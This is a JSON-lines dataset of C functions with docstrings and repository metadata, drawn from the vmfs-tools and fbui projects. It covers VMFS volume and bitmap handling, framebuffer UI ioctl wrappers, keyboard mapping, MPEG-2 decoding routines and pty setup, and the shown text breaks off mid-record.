{"docstring": "/* Close an LVM */\n", "func_signal": "static void vmfs_lvm_close(vmfs_device_t *dev)", "code": "{\n   vmfs_lvm_t *lvm = (vmfs_lvm_t *)dev;\n   if (!lvm)\n      return;\n   while(lvm->loaded_extents--)\n      vmfs_device_close(&lvm->extents[lvm->loaded_extents]->dev);\n\n   free(lvm);\n}", "path": "libvmfs\\vmfs_lvm.c", "repo_name": "glandium/vmfs-tools", "stars": 69, "license": "gpl-2.0", "language": "c", "size": 825}
{"docstring": "/* Add an extent to the LVM */\n", "func_signal": "int vmfs_lvm_add_extent(vmfs_lvm_t *lvm, vmfs_volume_t *vol)", "code": "{\n   uint32_t i;\n\n   if (!vol)\n      return(-1);\n\n   if (lvm->loaded_extents == 0) {\n      uuid_copy(lvm->lvm_info.uuid, vol->vol_info.lvm_uuid);\n      lvm->lvm_info.size = vol->vol_info.lvm_size;\n      lvm->lvm_info.blocks = vol->vol_info.blocks;\n      lvm->lvm_info.num_extents = vol->vol_info.num_extents;\n   } else if (uuid_compare(lvm->lvm_info.uuid, vol->vol_info.lvm_uuid)) {\n      fprintf(stderr, \"VMFS: The %s file/device is not part of the LVM\\n\", vol->device);\n      return(-1);\n   } else if ((lvm->lvm_info.size != vol->vol_info.lvm_size) ||\n              (lvm->lvm_info.blocks != vol->vol_info.blocks) ||\n              (lvm->lvm_info.num_extents != vol->vol_info.num_extents)) {\n      fprintf(stderr, \"VMFS: LVM information mismatch for the %s\"\n                      \" file/device\\n\", vol->device);\n      return(-1);\n   }\n\n   for (i = 0;\n        (i < lvm->loaded_extents) &&\n           (vol->vol_info.first_segment > lvm->extents[i]->vol_info.first_segment);\n        i++);\n\n   if (lvm->loaded_extents)\n      memmove(&lvm->extents[i + 1], &lvm->extents[i],\n              (lvm->loaded_extents - i) * sizeof(vmfs_volume_t *));\n   lvm->extents[i] = vol;\n   lvm->loaded_extents++;\n\n   return(0);\n}", "path": "libvmfs\\vmfs_lvm.c", "repo_name": "glandium/vmfs-tools", "stars": 69, "license": "gpl-2.0", "language": "c", "size": 825}
{"docstring": "/* Call a user function for each allocated item in a bitmap */\n", "func_signal": "void vmfs_bitmap_area_foreach(vmfs_bitmap_t *b,u_int area,\n                              vmfs_bitmap_foreach_cbk_t cbk,\n                              void *opt_arg)", "code": "{\n   DECL_ALIGNED_BUFFER(buf,VMFS_BITMAP_ENTRY_SIZE);\n   vmfs_bitmap_entry_t entry;\n   off_t pos;\n   uint32_t addr;\n   u_int array_idx,bit_idx;\n   u_int i,j;\n\n   pos = vmfs_bitmap_get_area_addr(&b->bmh,area);\n\n   for(i=0;i<b->bmh.bmp_entries_per_area;i++) {\n      if (vmfs_file_pread(b->f,buf,buf_len,pos) != buf_len)\n         break;\n\n      vmfs_bme_read(&entry,buf,1);\n\n      for(j=0;j<entry.total;j++) {\n         array_idx = j >> 3;\n         bit_idx   = j & 0x07;\n         \n         addr =  area * vmfs_bitmap_get_items_per_area(&b->bmh);\n         addr += i * b->bmh.items_per_bitmap_entry;\n         addr += j;\n\n         if (!(entry.bitmap[array_idx] & (1 << bit_idx)))\n            cbk(b,addr,opt_arg);\n      }\n\n      pos += buf_len;\n   }\n}", "path": "libvmfs\\vmfs_bitmap.c", "repo_name": "glandium/vmfs-tools", "stars": 69, "license": "gpl-2.0", "language": "c", "size": 825}
{"docstring": "/* Open a bitmap file */\n", "func_signal": "static inline vmfs_bitmap_t *vmfs_bitmap_open_from_file(vmfs_file_t *f)", "code": "{\n   DECL_ALIGNED_BUFFER(buf,512);\n   vmfs_bitmap_t *b;\n\n   if (!f)\n      return NULL;\n\n   if (vmfs_file_pread(f,buf,buf_len,0) != buf_len) {\n      vmfs_file_close(f);\n      return NULL;\n   }\n\n   if (!(b = calloc(1, sizeof(vmfs_bitmap_t)))) {\n      vmfs_file_close(f);\n      return NULL;\n   }\n\n   vmfs_bmh_read(&b->bmh, buf);\n   b->f = f;\n   return b;\n}", "path": "libvmfs\\vmfs_bitmap.c", "repo_name": "glandium/vmfs-tools", "stars": 69, "license": "gpl-2.0", "language": "c", "size": 825}
{"docstring": "/* Find a bitmap entry with at least \"num_items\" free in the specified area */\n", "func_signal": "int vmfs_bitmap_area_find_free_items(vmfs_bitmap_t *b,\n                                     u_int area,u_int num_items,\n                                     vmfs_bitmap_entry_t *entry)", "code": "{\n   vmfs_fs_t *fs;\n   u_char *buf,*ptr;\n   size_t buf_len;\n   off_t pos;\n   int res = -1;\n   int i;\n\n   fs = (vmfs_fs_t *)vmfs_file_get_fs(b->f);\n   pos = vmfs_bitmap_get_area_addr(&b->bmh,area);\n   buf_len = b->bmh.bmp_entries_per_area * VMFS_BITMAP_ENTRY_SIZE;\n\n   if (!(buf = iobuffer_alloc(buf_len)))\n      return(-1);\n\n   if (vmfs_file_pread(b->f,buf,buf_len,pos) != buf_len)\n      goto done;\n\n   for(i=0;i<b->bmh.bmp_entries_per_area;i++) {\n      ptr = buf + (i * VMFS_BITMAP_ENTRY_SIZE);\n      vmfs_bme_read(entry,ptr,1);\n\n      if (vmfs_metadata_is_locked(&entry->mdh) || (entry->free < num_items))\n         continue;\n\n      /* We now have to re-read the bitmap entry with the reservation taken */\n      if (!vmfs_metadata_lock(fs,entry->mdh.pos,\n                              ptr,VMFS_BITMAP_ENTRY_SIZE,\n                              &entry->mdh))\n      {      \n         vmfs_bme_read(entry,ptr,1);\n\n         if (entry->free < num_items) {\n            vmfs_metadata_unlock(fs,&entry->mdh);\n            continue;\n         }\n\n         res = 0;\n         break;\n      }\n   }\n\n done:\n   iobuffer_free(buf);\n   return(res);\n}", "path": "libvmfs\\vmfs_bitmap.c", "repo_name": "glandium/vmfs-tools", "stars": 69, "license": "gpl-2.0", "language": "c", "size": 825}
{"docstring": "/* Release the underlying volume given a LVM position */\n", "func_signal": "static int vmfs_lvm_release(const vmfs_device_t *dev,off_t pos)", "code": "{\n   vmfs_lvm_t *lvm = (vmfs_lvm_t *)dev;\n   vmfs_volume_t *extent = vmfs_lvm_get_extent_from_offset(lvm,pos);\n\n   if (!extent)\n      return(-1);\n\n   return(vmfs_device_release(&extent->dev, 0));\n}", "path": "libvmfs\\vmfs_lvm.c", "repo_name": "glandium/vmfs-tools", "stars": 69, "license": "gpl-2.0", "language": "c", "size": 825}
{"docstring": "/* Read a bitmap entry given a block id */\n", "func_signal": "int vmfs_bitmap_get_entry(vmfs_bitmap_t *b,uint32_t entry,uint32_t item,\n                          vmfs_bitmap_entry_t *bmp_entry)", "code": "{   \n   DECL_ALIGNED_BUFFER(buf,VMFS_BITMAP_ENTRY_SIZE);\n   uint32_t items_per_area;\n   u_int entry_idx,area;\n   off_t addr;\n\n   addr = (entry * b->bmh.items_per_bitmap_entry) + item;\n\n   items_per_area = vmfs_bitmap_get_items_per_area(&b->bmh);\n   area = addr / items_per_area;\n\n   entry_idx = (addr % items_per_area) / b->bmh.items_per_bitmap_entry;\n\n   addr = vmfs_bitmap_get_area_addr(&b->bmh,area);\n   addr += entry_idx * VMFS_BITMAP_ENTRY_SIZE;\n\n   if (vmfs_file_pread(b->f,buf,buf_len,addr) != buf_len)\n      return(-1);\n\n   vmfs_bme_read(bmp_entry,buf,1);\n   return(0);\n}", "path": "libvmfs\\vmfs_bitmap.c", "repo_name": "glandium/vmfs-tools", "stars": 69, "license": "gpl-2.0", "language": "c", "size": 825}
{"docstring": "/* Write a bitmap given its entry and item numbers */\n", "func_signal": "bool vmfs_bitmap_set_item(vmfs_bitmap_t *b,uint32_t entry,uint32_t item,\n                          u_char *buf)", "code": "{\n   off_t pos = vmfs_bitmap_get_item_pos(b,entry,item);\n   return(vmfs_file_pwrite(b->f,buf,b->bmh.data_size,pos) == b->bmh.data_size);\n}", "path": "libvmfs\\vmfs_bitmap.c", "repo_name": "glandium/vmfs-tools", "stars": 69, "license": "gpl-2.0", "language": "c", "size": 825}
{"docstring": "/* called only by wm */\n", "func_signal": "int\nfbui_hide (Display *dpy, Window *wm, short id)", "code": "{\n\tint result=0;\n\n\tif (!dpy) return -1;\n\t/*---------------*/\n\n\tstruct fbui_ctrlparams ctl;\n\tmemset (&ctl, 0, sizeof (struct fbui_ctrlparams));\n\tctl.op = FBUI_HIDE;\n\tctl.id = wm->id;\n\tctl.id2 = id;\n\n\treturn ioctl (dpy->fd, FBIO_UI_CONTROL, (unsigned long)&ctl) < 0 ? -errno : 0;\n}", "path": "libfbui\\libfbui.c", "repo_name": "8l/fbui", "stars": 125, "license": "None", "language": "c", "size": 739}
{"docstring": "/* called only by wm */\n", "func_signal": "int \nfbui_window_info (Display* dpy, Window *wm, struct fbui_wininfo* info, int ninfo)", "code": "{\n\tint result=0;\n\n\tif (!dpy || !info || ninfo<=0) return -1011;\n\t/*---------------*/\n\n\tstatic struct fbui_ctrlparams ctl;\n\tmemset (&ctl, 0, sizeof (struct fbui_ctrlparams));\n\tctl.op = FBUI_WININFO;\n\tctl.id = wm->id;\n\tctl.info = info;\n\tctl.ninfo = ninfo;\n\n\treturn ioctl (dpy->fd, FBIO_UI_CONTROL, (unsigned long) &ctl);\n}", "path": "libfbui\\libfbui.c", "repo_name": "8l/fbui", "stars": 125, "license": "None", "language": "c", "size": 739}
{"docstring": "/* reuse old picture buffers as soon as they are no longer needed \n   based on life-time axioms of MPEG */\n", "func_signal": "static void Update_Picture_Buffers()", "code": "{                           \n  int cc;              /* color component index */\n  unsigned char *tmp;  /* temporary swap pointer */\n\n  for (cc=0; cc<3; cc++)\n  {\n    /* B pictures do not need to be save for future reference */\n    if (picture_coding_type==B_TYPE)\n    {\n      current_frame[cc] = auxframe[cc];\n    }\n    else\n    {\n      /* only update at the beginning of the coded frame */\n      if (!Second_Field)\n      {\n        tmp = forward_reference_frame[cc];\n\n        /* the previously decoded reference frame is stored\n           coincident with the location where the backward \n           reference frame is stored (backwards prediction is not\n           needed in P pictures) */\n        forward_reference_frame[cc] = backward_reference_frame[cc];\n        \n        /* update pointer for potential future B pictures */\n        backward_reference_frame[cc] = tmp;\n      }\n\n      /* can erase over old backward reference frame since it is not used\n         in a P picture, and since any subsequent B pictures will use the \n         previously decoded I or P frame as the backward_reference_frame */\n      current_frame[cc] = backward_reference_frame[cc];\n    }\n\n    /* IMPLEMENTATION:\n       one-time folding of a line offset into the pointer which stores the\n       memory address of the current frame saves offsets and conditional \n       branches throughout the remainder of the picture processing loop */\n    if (picture_structure==BOTTOM_FIELD)\n      current_frame[cc]+= (cc==0) ? Coded_Picture_Width : Chroma_Width;\n  }\n}", "path": "libfbui\\MPEG\\getpic.c", "repo_name": "8l/fbui", "stars": 125, "license": "None", "language": "c", "size": 739}
{"docstring": "/*\n * Sleeps until a vt is activated, or the task is interrupted. Returns\n * 0 if activation, -EINTR if interrupted.\n */\n", "func_signal": "int vt_waitactive(int vt)", "code": "{\n\tint retval;\n\tDECLARE_WAITQUEUE(wait, current);\n\n\tadd_wait_queue(&vt_activate_queue, &wait);\n\tfor (;;) {\n\t\tset_current_state(TASK_INTERRUPTIBLE);\n\t\tretval = 0;\n\t\tif (vt == fg_console)\n\t\t\tbreak;\n\t\tretval = -EINTR;\n\t\tif (signal_pending(current))\n\t\t\tbreak;\n\t\tschedule();\n\t}\n\tremove_wait_queue(&vt_activate_queue, &wait);\n\tcurrent->state = TASK_RUNNING;\n\treturn retval;\n}", "path": "drivers\\char\\vt_ioctl.c", "repo_name": "8l/fbui", "stars": 125, "license": "None", "language": "c", "size": 739}
{"docstring": "/* parse system layer, ignore everything we don't need */\n", "func_signal": "void Next_Packet()", "code": "{\n  unsigned int code;\n  int l;\n\n  for(;;)\n  {\n    code = Get_Long();\n\n    /* remove system layer byte stuffing */\n    while ((code & 0xffffff00) != 0x100)\n      code = (code<<8) | Get_Byte();\n\n    switch(code)\n    {\n    case PACK_START_CODE: /* pack header */\n      /* skip pack header (system_clock_reference and mux_rate) */\n      ld->Rdptr += 8;\n      break;\n    case VIDEO_ELEMENTARY_STREAM:   \n      code = Get_Word();             /* packet_length */\n      ld->Rdmax = ld->Rdptr + code;\n\n      code = Get_Byte();\n\n      if((code>>6)==0x02)\n      {\n        ld->Rdptr++;\n        code=Get_Byte();  /* parse PES_header_data_length */\n        ld->Rdptr+=code;    /* advance pointer by PES_header_data_length */\n        printf(\"MPEG-2 PES packet\\n\");\n        return;\n      }\n      else if(code==0xff)\n      {\n        /* parse MPEG-1 packet header */\n        while((code=Get_Byte())== 0xFF);\n      }\n       \n      /* stuffing bytes */\n      if(code>=0x40)\n      {\n        if(code>=0x80)\n        {\n          fprintf(stderr,\"Error in packet header\\n\");\n          exit(1);\n        }\n        /* skip STD_buffer_scale */\n        ld->Rdptr++;\n        code = Get_Byte();\n      }\n\n      if(code>=0x30)\n      {\n        if(code>=0x40)\n        {\n          fprintf(stderr,\"Error in packet header\\n\");\n          exit(1);\n        }\n        /* skip presentation and decoding time stamps */\n        ld->Rdptr += 9;\n      }\n      else if(code>=0x20)\n      {\n        /* skip presentation time stamps */\n        ld->Rdptr += 4;\n      }\n      else if(code!=0x0f)\n      {\n        fprintf(stderr,\"Error in packet header\\n\");\n        exit(1);\n      }\n      return;\n    case ISO_END_CODE: /* end */\n      /* simulate a buffer full of sequence end codes */\n      l = 0;\n      while (l<2048)\n      {\n        ld->Rdbfr[l++] = SEQUENCE_END_CODE>>24;\n        ld->Rdbfr[l++] = SEQUENCE_END_CODE>>16;\n        ld->Rdbfr[l++] = SEQUENCE_END_CODE>>8;\n        ld->Rdbfr[l++] = SEQUENCE_END_CODE&0xff;\n      }\n      ld->Rdptr = ld->Rdbfr;\n      ld->Rdmax = ld->Rdbfr + 2048;\n      return;\n    default:\n      if(code>=SYSTEM_START_CODE)\n      {\n        /* skip system headers and non-video packets*/\n        code = Get_Word();\n        ld->Rdptr += code;\n      }\n      else\n      {\n        fprintf(stderr,\"Unexpected startcode %08x in system layer\\n\",code);\n        exit(1);\n      }\n      break;\n    }\n  }\n}", "path": "libfbui\\MPEG\\systems.c", "repo_name": "8l/fbui", "stars": 125, "license": "None", "language": "c", "size": 739}
{"docstring": "/* called only by wm */\n", "func_signal": "int\nfbui_redraw (Display *dpy, Window *wm, short win)", "code": "{\n\tint result=0;\n\n\tif (!dpy) return -1;\n\t/*---------------*/\n\n\tstruct fbui_ctrlparams ctl;\n\tmemset (&ctl, 0, sizeof (struct fbui_ctrlparams));\n\tctl.op = FBUI_REDRAW;\n\tctl.id = wm->id;\n\tctl.id2 = win;\n\n\treturn ioctl (dpy->fd, FBIO_UI_CONTROL, (unsigned long)&ctl) < 0 ? -errno : 0;\n}", "path": "libfbui\\libfbui.c", "repo_name": "8l/fbui", "stars": 125, "license": "None", "language": "c", "size": 739}
{"docstring": "/* mostly IMPLEMENTAION specific rouintes */\n", "func_signal": "static void Initialize_Sequence()", "code": "{\n  int cc, size;\n  static int Table_6_20[3] = {6,8,12};\n\n  /* check scalability mode of enhancement layer */\n  if (Two_Streams && (enhan.scalable_mode!=SC_SNR) && (base.scalable_mode!=SC_DP))\n    Error(\"unsupported scalability mode\\n\");\n\n  /* force MPEG-1 parameters for proper decoder behavior */\n  /* see ISO/IEC 13818-2 section D.9.14 */\n  if (!base.MPEG2_Flag)\n  {\n    progressive_sequence = 1;\n    progressive_frame = 1;\n    picture_structure = FRAME_PICTURE;\n    frame_pred_frame_dct = 1;\n    chroma_format = CHROMA420;\n    matrix_coefficients = 5;\n  }\n\n  /* round to nearest multiple of coded macroblocks */\n  /* ISO/IEC 13818-2 section 6.3.3 sequence_header() */\n  mb_width = (horizontal_size+15)/16;\n  mb_height = (base.MPEG2_Flag && !progressive_sequence) ? 2*((vertical_size+31)/32)\n                                        : (vertical_size+15)/16;\n\n  Coded_Picture_Width = 16*mb_width;\n  Coded_Picture_Height = 16*mb_height;\n\n  /* ISO/IEC 13818-2 sections 6.1.1.8, 6.1.1.9, and 6.1.1.10 */\n  Chroma_Width = (chroma_format==CHROMA444) ? Coded_Picture_Width\n                                           : Coded_Picture_Width>>1;\n  Chroma_Height = (chroma_format!=CHROMA420) ? Coded_Picture_Height\n                                            : Coded_Picture_Height>>1;\n  \n  /* derived based on Table 6-20 in ISO/IEC 13818-2 section 6.3.17 */\n  block_count = Table_6_20[chroma_format-1];\n\n  for (cc=0; cc<3; cc++)\n  {\n    if (cc==0)\n      size = Coded_Picture_Width*Coded_Picture_Height;\n    else\n      size = Chroma_Width*Chroma_Height;\n\n    if (!(backward_reference_frame[cc] = (unsigned char *)malloc(size)))\n      Error(\"backward_reference_frame[] malloc failed\\n\");\n\n    if (!(forward_reference_frame[cc] = (unsigned char *)malloc(size)))\n      Error(\"forward_reference_frame[] malloc failed\\n\");\n\n    if (!(auxframe[cc] = (unsigned char *)malloc(size)))\n      Error(\"auxframe[] malloc failed\\n\");\n\n    if(Ersatz_Flag)\n      if (!(substitute_frame[cc] = (unsigned char *)malloc(size)))\n        Error(\"substitute_frame[] malloc failed\\n\");\n\n\n    if (base.scalable_mode==SC_SPAT)\n    {\n      /* this assumes lower layer is 4:2:0 */\n      if (!(llframe0[cc] = (unsigned char *)malloc((lower_layer_prediction_horizontal_size*lower_layer_prediction_vertical_size)/(cc?4:1))))\n        Error(\"llframe0 malloc failed\\n\");\n      if (!(llframe1[cc] = (unsigned char *)malloc((lower_layer_prediction_horizontal_size*lower_layer_prediction_vertical_size)/(cc?4:1))))\n        Error(\"llframe1 malloc failed\\n\");\n    }\n  }\n\n  /* SCALABILITY: Spatial */\n  if (base.scalable_mode==SC_SPAT)\n  {\n    if (!(lltmp = (short *)malloc(lower_layer_prediction_horizontal_size*((lower_layer_prediction_vertical_size*vertical_subsampling_factor_n)/vertical_subsampling_factor_m)*sizeof(short))))\n      Error(\"lltmp malloc failed\\n\");\n  }\n\n#ifdef DISPLAY\n  if (Output_Type==T_X11)\n  {\n    Initialize_Display_Process(\"\");\n    Initialize_Dither_Matrix();\n  }\n#endif /* DISPLAY */\n\n}", "path": "libfbui\\MPEG\\mpeg2dec.c", "repo_name": "8l/fbui", "stars": 125, "license": "None", "language": "c", "size": 739}
{"docstring": "/* 1 => force all windows to be auto placed\n */\n/* called only by wm */\n", "func_signal": "int \nfbui_placement (Display* dpy, Window *wm, int yes)", "code": "{\n\tint result=0;\n\n\tif (!dpy) return -1;\n\t/*---------------*/\n\n\tstruct fbui_ctrlparams ctl;\n\tmemset (&ctl, 0, sizeof (struct fbui_ctrlparams));\n\tctl.op = FBUI_PLACEMENT;\n\tctl.id = wm->id;\n\tctl.x = yes;\n\n\treturn ioctl (dpy->fd, FBIO_UI_CONTROL, (unsigned long) &ctl) < 0 ? -errno : 0;\n}", "path": "libfbui\\libfbui.c", "repo_name": "8l/fbui", "stars": 125, "license": "None", "language": "c", "size": 739}
{"docstring": "/*#endif*/\n", "func_signal": "int forkpty_findtty (int* master_fd, int* slave_fd, char *name)", "code": "{\n\tint n;\n\tchar master_name[16];\n\tchar slave_name[16];\n\n\tfor (n=0; n<16; n++)\n\t{\n\t\tsprintf (master_name, \"/dev/ptyp%x\", n);\n\t\t*master_fd = open (master_name, O_RDWR);\n\t\tif (*master_fd >= 0) break;\n\t}\n\n\tif (n==16) return -1;\n\n\tsprintf (slave_name, \"/dev/ttyp%x\", n);\n\tsprintf (name, \"/dev/ttyp%x\", n);\n\t*slave_fd = open (slave_name, O_RDWR);\n\tif (*slave_fd < 0)\n\t{\n\t\tperror (slave_name);\n\t\tclose (*master_fd);\n\t\treturn -1;\n\t}\n\t\n\treturn 0;\n}", "path": "libfbui\\Term\\forkpty.c", "repo_name": "8l/fbui", "stars": 125, "license": "None", "language": "c", "size": 739}
{"docstring": "/* called only by wm */\n", "func_signal": "int\nfbui_move_resize (Display *dpy, Window *wm, short id, short x0, short y0, short x1, short y1)", "code": "{\n\tint result=0;\n\n\tif (!dpy) return -1;\n\t/*---------------*/\n\n\tif (x0>x1) { short tmp=x0;x0=x1;x1=tmp; }\n\tif (y0>y1) { short tmp=y0;y0=y1;y1=tmp; }\n\n\tstruct fbui_ctrlparams ctl;\n\tmemset (&ctl, 0, sizeof (struct fbui_ctrlparams));\n\tctl.op = FBUI_MOVE_RESIZE;\n\tctl.id = wm->id;\n\tctl.id2 = id;\n\tctl.x = x0;\n\tctl.y = y0;\n\tctl.width = x1-x0+1;\n\tctl.height = y1-y0+1;\n\n\treturn ioctl (dpy->fd, FBIO_UI_CONTROL, (unsigned long)&ctl) < 0 ? -errno : 0;\n}", "path": "libfbui\\libfbui.c", "repo_name": "8l/fbui", "stars": 125, "license": "None", "language": "c", "size": 739}
{"docstring": "/* variables to keep track of the occurance of redundant headers between pictures */\n", "func_signal": "void Clear_Verify_Headers()", "code": "{\n  verify_sequence_header = 0;\n  verify_group_of_pictures_header = 0;\n  verify_picture_header = 0;\n  verify_slice_header = 0;\n  verify_sequence_extension = 0;\n  verify_sequence_display_extension = 0;\n  verify_quant_matrix_extension = 0;\n  verify_sequence_scalable_extension = 0;\n  verify_picture_display_extension = 0;\n  verify_picture_coding_extension = 0;\n  verify_picture_spatial_scalable_extension = 0;\n  verify_picture_temporal_scalable_extension = 0;\n  verify_copyright_extension = 0;\n}", "path": "libfbui\\MPEG\\verify.c", "repo_name": "8l/fbui", "stars": 125, "license": "None", "language": "c", "size": 739}
{"docstring": "// key info that comes from FBUI : bits 0-1= state 2-15=keycode\n", "func_signal": "int\nfbui_convert_key (Display *dpy, long keyinfo)", "code": "{\n\tint key,state;\n\tunsigned short ch=0;\n\n\tif (!dpy) return -1;\n\t/*---------------*/\n\n\tstate = 3 & keyinfo;\n\tkey = keyinfo >> 2;\n\n\tswitch (key) {\n\tcase KEY_RIGHTSHIFT:\n\tcase KEY_LEFTSHIFT: \n\t\tdpy->shift = state>0;\n\t\treturn 0;\n\n\tcase KEY_RIGHTCTRL:\n\tcase KEY_LEFTCTRL: \n\t\tdpy->ctrl = state>0;\n\t\treturn 0;\n\n\tcase KEY_RIGHTALT:\n\tcase KEY_LEFTALT: \n\t\tdpy->alt = state>0;\n\t\treturn 0;\n\t}\n\n\tif (state==0)\n\t\treturn 0;\n\n\tswitch (key) {\n\tcase KEY_ENTER: ch = '\\n'; break;\n\tcase KEY_ESC: ch = 27; break;\n\tcase KEY_SPACE: ch = ' '; break;\n\tcase KEY_MINUS: ch = !dpy->shift ? '-' : '_'; break;\n\tcase KEY_EQUAL: ch = !dpy->shift ? '=' : '+'; break;\n\tcase KEY_BACKSPACE: ch = 8; break;\n\tcase KEY_SEMICOLON: ch = !dpy->shift ? ';' : ':'; break;\n\tcase KEY_COMMA: ch = !dpy->shift ? ',' : '<'; break;\n\tcase KEY_DOT: ch = !dpy->shift ? '.' : '>'; break;\n\tcase KEY_GRAVE: ch = !dpy->shift ? '`' : '~'; break;\n\tcase KEY_BACKSLASH: ch = !dpy->shift ? '\\\\' : '|'; break;\n\tcase KEY_LEFTBRACE: ch = !dpy->shift ? '[' : '{'; break;\n\tcase KEY_RIGHTBRACE: ch = !dpy->shift ? ']' : '}'; break;\n\tcase KEY_APOSTROPHE: ch = !dpy->shift ? '\\'' : '\"'; break;\n\tcase KEY_SLASH: ch = !dpy->shift ? '/' : '?'; break;\n\tcase KEY_TAB: ch = !dpy->shift ? '\\t' : FBUI_LEFTTAB; break;\n\tcase KEY_A: ch = 'a'; break;\n\tcase KEY_B: ch = 'b'; break;\n\tcase KEY_C: ch = 'c'; break;\n\tcase KEY_D: ch = 'd'; break;\n\tcase KEY_E: ch = 'e'; break;\n\tcase KEY_F: ch = 'f'; break;\n\tcase KEY_G: ch = 'g'; break;\n\tcase KEY_H: ch = 'h'; break;\n\tcase KEY_I: ch = 'i'; break;\n\tcase KEY_J: ch = 'j'; break;\n\tcase KEY_K: ch = 'k'; break;\n\tcase KEY_L: ch = 'l'; break;\n\tcase KEY_M: ch = 'm'; break;\n\tcase KEY_N: ch = 'n'; break;\n\tcase KEY_O: ch = 'o'; break;\n\tcase KEY_P: ch = 'p'; break;\n\tcase KEY_Q: ch = 'q'; break;\n\tcase KEY_R: ch = 'r'; break;\n\tcase KEY_S: ch = 's'; break;\n\tcase KEY_T: ch = 't'; break;\n\tcase KEY_U: ch = 'u'; break;\n\tcase KEY_V: ch = 'v'; break;\n\tcase KEY_W: ch = 'w'; break;\n\tcase KEY_X: ch = 'x'; break;\n\tcase KEY_Y: ch = 'y'; break;\n\tcase KEY_Z: ch = 'z'; break;\n\tcase KEY_0: ch = '0'; break;\n\tcase KEY_1: ch = '1'; break;\n\tcase KEY_2: ch = '2'; break;\n\tcase KEY_3: ch = '3'; break;\n\tcase KEY_4: ch = '4'; break;\n\tcase KEY_5: ch = '5'; break;\n\tcase KEY_6: ch = '6'; break;\n\tcase KEY_7: ch = '7'; break;\n\tcase KEY_8: ch = '8'; break;\n\tcase KEY_9: ch = '9'; break;\n\n\t/* special chars section */\n\tcase KEY_UP: ch = FBUI_UP; break;\n\tcase KEY_DOWN: ch = FBUI_DOWN; break;\n\tcase KEY_LEFT: ch = FBUI_LEFT; break;\n\tcase KEY_RIGHT: ch = FBUI_RIGHT; break;\n\n\tcase KEY_INSERT: ch = FBUI_INS; break;\n\tcase KEY_DELETE: ch = FBUI_DEL; break;\n\tcase KEY_HOME: ch = FBUI_HOME; break;\n\tcase KEY_END: ch = FBUI_END; break;\n\tcase KEY_PAGEUP: ch = FBUI_PGUP; break;\n\tcase KEY_PAGEDOWN: ch = FBUI_PGDN; break;\n\tcase KEY_SCROLLLOCK: ch = FBUI_SCRLK; break;\n\tcase KEY_NUMLOCK: ch = FBUI_NUMLK; break;\n\tcase KEY_CAPSLOCK: ch = FBUI_CAPSLK; break;\n\n\tcase KEY_PRINT: ch = FBUI_PRTSC; break;\n\n\tcase KEY_F1: ch = FBUI_F1; break;\n\tcase KEY_F2: ch = FBUI_F2; break;\n\tcase KEY_F3: ch = FBUI_F3; break;\n\tcase KEY_F4: ch = FBUI_F4; break;\n\tcase KEY_F5: ch = FBUI_F5; break;\n\tcase KEY_F6: ch = FBUI_F6; break;\n\tcase KEY_F7: ch = FBUI_F7; break;\n\tcase KEY_F8: ch = FBUI_F8; break;\n\tcase KEY_F9: ch = FBUI_F9; break;\n\tcase KEY_F10: ch = FBUI_F10; break;\n\tcase KEY_F11: ch = FBUI_F11; break;\n\tcase KEY_F12: ch = FBUI_F12; break;\n\n\t/* mouse buttons */\n\tcase BTN_LEFT: ch = FBUI_BUTTON_LEFT; break;\n\tcase BTN_RIGHT: ch = FBUI_BUTTON_RIGHT; break;\n\tcase BTN_MIDDLE: ch = FBUI_BUTTON_MIDDLE; break;\n\t}\n\n\tif (dpy->ctrl && isalpha(ch))\n\t\tch &= 31;\n\telse\n\tif (dpy->shift && isalpha(ch))\n\t\tch = toupper(ch);\n\n\tif (dpy->shift && isdigit(ch)) {\n\t\tswitch (ch) {\n\t\tcase '0': ch = ')'; break;\n\t\tcase '1': ch = '!'; break;\n\t\tcase '2': ch = '@'; break;\n\t\tcase '3': ch = '#'; break;\n\t\tcase '4': ch = '$'; break;\n\t\tcase '5': ch = '%'; break;\n\t\tcase '6': ch = '^'; break;\n\t\tcase '7': ch = '&'; break;\n\t\tcase '8': ch = '*'; break;\n\t\tcase '9': ch = '('; break;\n\t\t}\n\t}\n\n\treturn ch;\n}", "path": "libfbui\\libfbui.c", "repo_name": "8l/fbui", "stars": 125, "license": "None", "language": "c", "size": 739}
{"docstring": "/* get reference frame */\n", "func_signal": "void Spatial_Prediction()", "code": "{\n  \n  if(Frame_Store_Flag)\n  {\n    Read_Lower_Layer_Component_Framewise(0,lower_layer_prediction_horizontal_size, \n      lower_layer_prediction_vertical_size);      /* Y */\n    Read_Lower_Layer_Component_Framewise(1,lower_layer_prediction_horizontal_size>>1,\n      lower_layer_prediction_vertical_size>>1);   /* Cb (\"U\") */\n    Read_Lower_Layer_Component_Framewise(2,lower_layer_prediction_horizontal_size>>1,\n      lower_layer_prediction_vertical_size>>1);   /* Cr (\"V\") */\n  }\n  else\n  {\n    Read_Lower_Layer_Component_Fieldwise(0,lower_layer_prediction_horizontal_size, \n      lower_layer_prediction_vertical_size);      /* Y */\n    Read_Lower_Layer_Component_Fieldwise(1,lower_layer_prediction_horizontal_size>>1,\n      lower_layer_prediction_vertical_size>>1);   /* Cb (\"U\") */\n    Read_Lower_Layer_Component_Fieldwise(2,lower_layer_prediction_horizontal_size>>1,\n      lower_layer_prediction_vertical_size>>1);   /* Cr (\"V\") */\n  }\n\n\n  Make_Spatial_Prediction_Frame  /* Y */\n    (progressive_frame,lower_layer_progressive_frame,llframe0[0],llframe1[0],\n     lltmp,current_frame[0],lower_layer_horizontal_offset,\n     lower_layer_vertical_offset,\n     lower_layer_prediction_horizontal_size,\n     lower_layer_prediction_vertical_size,\n     horizontal_size,vertical_size,vertical_subsampling_factor_m,\n     vertical_subsampling_factor_n,horizontal_subsampling_factor_m,\n     horizontal_subsampling_factor_n,\n     picture_structure!=FRAME_PICTURE); /* this changed from CD to DIS */\n\n  Make_Spatial_Prediction_Frame  /* Cb */\n    (progressive_frame,lower_layer_progressive_frame,llframe0[1],llframe1[1],\n     lltmp,current_frame[1],lower_layer_horizontal_offset/2,\n     lower_layer_vertical_offset/2,\n     lower_layer_prediction_horizontal_size>>1,\n     lower_layer_prediction_vertical_size>>1,\n     horizontal_size>>1,vertical_size>>1,vertical_subsampling_factor_m,\n     vertical_subsampling_factor_n,horizontal_subsampling_factor_m,\n     horizontal_subsampling_factor_n,1);\n\n  Make_Spatial_Prediction_Frame  /* Cr */\n    (progressive_frame,lower_layer_progressive_frame,llframe0[2],llframe1[2],\n     lltmp,current_frame[2],lower_layer_horizontal_offset/2,\n     lower_layer_vertical_offset/2,\n     lower_layer_prediction_horizontal_size>>1,\n     lower_layer_prediction_vertical_size>>1,\n     